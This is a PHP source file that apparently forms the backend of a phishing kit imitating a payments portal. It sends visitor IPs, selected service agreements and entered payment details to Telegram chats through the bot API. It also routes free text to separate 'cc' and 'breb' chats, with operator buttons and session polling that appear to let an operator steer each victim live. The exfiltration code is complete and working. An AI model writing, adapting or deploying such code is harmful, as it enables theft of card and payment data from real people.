<?php
/**
 * log2.php — Endpoint unificado de logging a Telegram.
 *
 * Ruta A · campo "tipo"  → mensajes estructurados (MarkdownV2) al chat principal.
 *   Tipos: visita | convenio | paso_uno
 *
 * Ruta B · campo "text"  → texto libre (HTML) con soporte de botones inline
 *   y polling de sesión. Usa action: cc | breb | (general).
 *   Utilizado por portalpagos.php, pasodos.php y el webhook de tarjetas.
 */
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'method_not_allowed']);
    exit;
}

require_once __DIR__ . '/config.php';

// ── Resolución de constantes (compatible con ambos configs) ───────────────
//    Config nuevo:   TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID / TELEGRAM_CC_ID
//    Config actual:  TG_TOKEN / TG_CHAT / TG_CHAT_CC / TG_CHAT_BREB
$L2_TOKEN     = defined('TG_TOKEN')      ? TG_TOKEN      : (defined('TELEGRAM_BOT_TOKEN') ? TELEGRAM_BOT_TOKEN : '');
$L2_CHAT      = defined('TG_CHAT')       ? TG_CHAT       : (defined('TELEGRAM_CHAT_ID')   ? TELEGRAM_CHAT_ID   : '');
$L2_CHAT_CC   = defined('TG_CHAT_CC')    ? TG_CHAT_CC    : (defined('TELEGRAM_CC_ID')     ? TELEGRAM_CC_ID     : $L2_CHAT);
$L2_CHAT_BREB = defined('TG_CHAT_BREB')  ? TG_CHAT_BREB  : $L2_CHAT_CC;

if (!$L2_TOKEN || !$L2_CHAT) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'config_missing']);
    exit;
}

// ── Helpers inline (no dependen de que config.php los tenga) ──────────────

function l2_ip(): string
{
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return 'desconocida';
}

function l2_escMD(string $t): string
{
    foreach (['_','*','[',']','(',')',  '~','`','>','#','+','-','=','|','{','}','.','!'] as $c) {
        $t = str_replace($c, '\\' . $c, $t);
    }
    return $t;
}

function l2_clean($v, int $max = 200): string
{
    $v = is_scalar($v) ? (string)$v : '';
    $v = trim(preg_replace('/[\x00-\x1F\x7F]/u', '', $v) ?? '');
    return mb_strlen($v) > $max ? mb_substr($v, 0, $max) : $v;
}

function l2_rateOK(string $ip): bool
{
    $dir = sys_get_temp_dir() . '/tg_rl2';
    if (!is_dir($dir)) @mkdir($dir, 0700, true);
    $file = $dir . '/' . md5($ip);
    $now  = time();
    if (is_file($file) && ($now - (int)@file_get_contents($file)) < 2) return false;
    @file_put_contents($file, (string)$now, LOCK_EX);
    return true;
}

function l2_sendMD(string $msg, string $token, string $chat): bool
{
    $url     = 'https://api.telegram.org/bot' . $token . '/sendMessage';
    $payload = [
        'chat_id'                  => $chat,
        'text'                     => $msg,
        'parse_mode'               => 'MarkdownV2',
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $resp !== false && $code === 200;
}

function l2_sendHTML(string $token, string $chatId, string $text, array $buttons = []): void
{
    $payload = [
        'chat_id'    => $chatId,
        'text'       => $text,
        'parse_mode' => 'HTML',
    ];
    if ($buttons) $payload['reply_markup'] = ['inline_keyboard' => $buttons];

    $ch = curl_init('https://api.telegram.org/bot' . $token . '/sendMessage');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_TIMEOUT        => 8,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// ── Leer payload ──────────────────────────────────────────────────────────

$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'bad_json']);
    exit;
}

$ip = l2_ip();

if (!l2_rateOK($ip)) {
    http_response_code(429);
    echo json_encode(['ok' => false, 'error' => 'rate_limited']);
    exit;
}

// ════════════════════════════════════════════════════════════════════════════
// RUTA A — campo "tipo": mensajes estructurados → MarkdownV2 → chat principal
// ════════════════════════════════════════════════════════════════════════════

if (!empty($data['tipo'])) {

    $tipo    = $data['tipo'];
    $mensaje = '';

    switch ($tipo) {

        case 'visita':
            $pagina  = l2_clean($data['pagina'] ?? 'index.php', 120);
            $mensaje = "🟢 *NUEVA VISITA*\n"
                     . "📄 Página: " . l2_escMD("Buscar conjunto ({$pagina})") . "\n"
                     . "🌐 IP: "     . l2_escMD($ip);
            break;

        case 'convenio':
            $nombre    = l2_clean($data['nombre']    ?? 'desconocido',  180);
            $convenio  = l2_clean($data['convenio']  ?? 'N/A',           60);
            $categoria = l2_clean($data['categoria'] ?? 'sin categoría', 120);
            $mensaje   = "🔹 *CONVENIO SELECCIONADO*\n"
                       . "🔶 Nombre: "    . l2_escMD($nombre)    . "\n"
                       . "🔑 Convenio: "  . l2_escMD($convenio)  . "\n"
                       . "🔖 Categoria: " . l2_escMD($categoria) . "\n"
                       . "🌐 IP: "        . l2_escMD($ip);
            break;

        case 'paso_uno':
            $nombre     = l2_clean($data['nombre']      ?? 'desconocido',  180);
            $convenioId = l2_clean($data['convenio']    ?? 'N/A',           60);
            $categoria  = l2_clean($data['categoria']   ?? 'sin categoría', 120);
            $referencia = l2_clean($data['referencia']  ?? 'vacío',         120);
            $valor      = l2_clean($data['valor']       ?? 'vacío',          60);
            $mensaje    = "📝 *DATOS DE PAGO INGRESADOS*\n"
                        . "🔶 Nombre: "     . l2_escMD($nombre)     . "\n"
                        . "🔑 Convenio: "   . l2_escMD($convenioId) . "\n"
                        . "🔖 Categoria: "  . l2_escMD($categoria)  . "\n"
                        . "🧾 Referencia: " . l2_escMD($referencia) . "\n"
                        . "💰 Valor: "      . l2_escMD($valor)      . "\n"
                        . "🌐 IP: "         . l2_escMD($ip);
            break;

        default:
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'tipo_invalido']);
            exit;
    }

    $ok = l2_sendMD($mensaje, $L2_TOKEN, $L2_CHAT);
    echo json_encode(['ok' => $ok]);
    exit;
}

// ════════════════════════════════════════════════════════════════════════════
// RUTA B — campo "text": texto libre HTML → chat según "action", con botones
// ════════════════════════════════════════════════════════════════════════════

if (empty($data['text'])) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'missing_text_or_tipo']);
    exit;
}

// Crear sesión para polling si viene session_id
if (!empty($data['session_id'])) {
    $sid = preg_replace('/[^a-zA-Z0-9_\-]/', '', $data['session_id']);
    $dir = sys_get_temp_dir() . '/jelpit2_sessions/';
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    file_put_contents($dir . $sid . '.json', json_encode(['status' => 'pending']));
}

$action = $data['action'] ?? '';
if ($action === 'cc')        $chatId = $L2_CHAT_CC;
elseif ($action === 'breb')  $chatId = $L2_CHAT_BREB;
else                         $chatId = $L2_CHAT;

$buttons = is_array($data['buttons'] ?? null) ? $data['buttons'] : [];
l2_sendHTML($L2_TOKEN, $chatId, $data['text'], $buttons);

echo json_encode(['ok' => true]);
